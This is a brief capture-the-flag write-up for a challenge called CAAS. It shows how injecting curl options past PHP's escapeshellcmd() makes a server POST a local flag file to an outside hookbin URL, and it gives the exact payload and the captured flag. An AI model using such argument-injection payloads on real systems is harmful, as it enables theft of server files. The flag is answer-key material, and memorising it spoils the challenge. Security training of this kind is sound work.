### CAAS

#### Problem

- Hint : Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?
  This challenge will raise 43 euros for a good cause.

#### Writeup

- Analyze the given files, we can find that "curl -sL" is executed if we send a POST request with ip parameter
- But, it is passed from escapeshellcmd(), which escapes multiple cmds passed in the request.
- So, to fool escapeshellcmd() ,we follow instructions from <a href="https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#curl">link</a>
- We spawn a hookbin url and pass the following request using postman
  `-d @../../flag https://hookb.in/lJ2wk1D18NcrXXZWdyND`
- -d options passed data and @ fetches the file for curl option.
- We get the flag - `CHTB{f1le_r3trieval_4s_a_s3rv1ce}`
